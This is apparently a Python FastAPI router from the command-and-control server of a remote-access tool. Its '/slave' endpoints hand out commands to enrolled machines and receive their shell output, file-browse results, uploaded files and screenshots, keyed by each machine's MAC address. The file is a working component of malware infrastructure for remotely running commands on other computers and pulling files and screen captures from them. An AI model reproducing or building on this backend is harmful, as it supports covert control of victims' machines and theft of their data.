from fastapi import APIRouter, Request, UploadFile
import service as Service
import os
from models import SlaveCommandRequest, SlaveTextOutputRequest, SlaveFileBrowseOutputRequest

slave = APIRouter(
    prefix="/slave"
)

@slave.post("/command")
async def command(request: Request, slave_command: SlaveCommandRequest):
    return Service.get_slave_command(request,slave_command)
    
@slave.post("/response/text")
async def textresponse(slave_text_op_req : SlaveTextOutputRequest):
    return Service.set_slave_shell_command_output(slave_text_op_req)

@slave.post("/response/filebrowse")
async def filebrowseresponse(slave_file_browse_op_req : SlaveFileBrowseOutputRequest):
    return Service.set_slave_file_browse_command_output(slave_file_browse_op_req)
    
@slave.post("/response/file")
async def fileresponse(mac: str, file: UploadFile):
    return Service.save_slave_file_upload(mac,file)

@slave.post("/response/screenshot")
async def screenshotresponse(mac: str, file: UploadFile):
    return Service.save_screenshot_from_slave(mac, file)